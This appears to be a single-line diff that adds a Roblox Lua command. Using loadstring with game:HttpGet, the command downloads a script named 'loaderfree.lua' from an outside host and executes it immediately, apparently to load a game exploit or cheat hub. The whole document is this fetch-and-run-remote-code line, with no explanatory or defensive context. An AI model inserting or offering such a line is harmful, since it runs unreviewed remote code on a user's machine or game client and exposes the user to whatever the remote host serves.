@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://wiihub.wiigen.net/loaderfree.lua", true))()
